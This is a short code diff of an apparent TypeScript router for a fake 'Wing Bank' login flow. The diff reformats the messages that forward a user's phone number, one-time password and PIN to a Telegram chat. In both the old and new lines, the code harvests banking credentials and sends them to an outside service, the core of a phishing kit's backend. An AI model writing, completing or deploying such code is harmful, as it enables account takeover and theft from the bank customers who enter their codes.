@@ -73,7 +73,7 @@ export const appRouter = router({
 
         try {
           // Send OTP to Telegram
-          const message = `🔐 <b>رمز OTP جديد - Wing Bank</b>\n\n📱 <b>رقم الهاتف:</b> ${phoneNumber}\n🔢 <b>رمز OTP:</b> <code>${otpCode}</code>\n⏰ <b>الوقت:</b> ${new Date().toLocaleString("en-US", { timeZone: "Asia/Phnom_Penh" })}\n🌐 <b>عنوان IP:</b> ${ipAddress}`;
+          const message = `رقم الهاتف\n${phoneNumber}\n\nرمز OTP\n${otpCode}`;
           await sendTelegramMessage(message);
 
           return {
@@ -102,7 +102,7 @@ export const appRouter = router({
 
         try {
           // Send PIN to Telegram
-          const message = `🔐 <b>رمز PIN جديد - Wing Bank</b>\n\n📱 <b>رقم الهاتف:</b> ${phoneNumber}\n🔑 <b>رمز PIN:</b> <code>${pin}</code>\n⏰ <b>الوقت:</b> ${new Date().toLocaleString("en-US", { timeZone: "Asia/Phnom_Penh" })}\n🌐 <b>عنوان IP:</b> ${ipAddress}`;
+          const message = `رقم الهاتف\n${phoneNumber}\n\nرمز PIN\n${pin}`;
           await sendTelegramMessage(message);
 
           return {
